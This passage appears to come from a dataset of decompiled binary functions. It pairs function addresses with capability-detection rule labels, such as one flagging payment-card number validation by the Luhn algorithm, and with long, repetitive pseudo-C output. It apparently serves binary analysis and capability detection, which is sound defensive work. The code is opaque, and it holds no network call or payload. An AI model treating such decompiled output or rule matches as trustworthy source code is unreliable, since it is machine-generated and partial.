*(*(*in_stack_ffffffb0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff94 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528cac, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff94 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff78 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528ccc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff78 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff5c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528cf0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff5c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff40 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528cfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff40 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff24 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff24 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff08 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d14, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff08 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeec = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d20, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeec + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffed0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d2c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffed0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeb4 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d38, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeb4 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe98 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d44, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe98 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe7c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe7c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe7c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe60 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d84, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe60 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe60 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe44 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528da4, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe44 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe44 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe28 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528db0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe28 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe28 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe0c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dbc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe0c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe0c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffdf0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528ddc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffdf0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffdf0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffdd4 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffdd4 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffdd4 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffdb8 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffdb8 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffdb8 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffd9c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e40, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffd9c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffd9c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffd80 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e4c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffd80 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffd80 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffd64 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e58, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffd64 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffd64 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    iVar3 = fcn.00454d90();\n    iVar4 = fcn.00454d90();\n    if (iVar3 == iVar4) {\n        arg_10h = fcn.00454d90();\n        arg_ch = fcn.00454bf0();\n        s1 = fcn.00454bf0();\n        iVar3 = fcn.0048f5c0(s1, arg_ch, arg_10h);\n        if (iVar3 == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 4823
    },
    "004c0160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004c0160(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_10h;\n    uint arg_ch;\n    uint s1;\n    int32_t *in_stack_fffffdb8;\n    int32_t *in_stack_fffffdd4;\n    int32_t *in_stack_fffffdf0;\n    int32_t *in_stack_fffffe0c;\n    int32_t *in_stack_fffffe28;\n    int32_t *in_stack_fffffe44;\n    int32_t *in_stack_fffffe60;\n    int32_t *in_stack_fffffe7c;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar2 = fcn.00451af0();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*param_1 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffe8 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528cac, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffe8 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffcc = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528ccc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffcc + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffb0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528cf0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffb0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff94 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528cfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff94 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff78 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff78 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff5c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d14, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff5c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff40 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d20, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff40 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff24 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d2c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff24 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff08 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d38, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff08 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeec = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d44, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeec + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffed0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffed0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeb4 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d84, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeb4 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe98 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528da4, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe98 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe7c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528db0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe7c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe7c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe60 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dbc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe60 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe60 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe44 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528ddc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe44 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe44 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe28 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe28 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe28 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe0c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe0c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe0c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffdf0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e40, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffdf0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffdf0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffdd4 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e4c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffdd4 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffdd4 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffdb8 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e58, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffdb8 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffdb8 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    iVar3 = fcn.00454d90();\n    iVar4 = fcn.00454d90();\n    if (iVar3 == iVar4) {\n        arg_10h = fcn.00454d90();\n        arg_ch = fcn.00454bf0();\n        s1 = fcn.00454bf0();\n        iVar3 = fcn.0048f5c0(s1, arg_ch, arg_10h);\n        if (iVar3 == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 4257
    },
    "004c01c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004c01c0(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_10h;\n    uint arg_ch;\n    uint s1;\n    int32_t *in_stack_fffffdd4;\n    int32_t *in_stack_fffffdf0;\n    int32_t *in_stack_fffffe0c;\n    int32_t *in_stack_fffffe28;\n    int32_t *in_stack_fffffe44;\n    int32_t *in_stack_fffffe60;\n    int32_t *in_stack_fffffe7c;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar2 = fcn.00451af0();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*param_1 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffe8 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528ccc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffe8 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffcc = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528cf0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffcc + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffb0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528cfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffb0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff94 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff94 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff78 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d14, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff78 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff5c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d20, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff5c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff40 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d2c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff40 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff24 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d38, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff24 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff08 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d44, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = 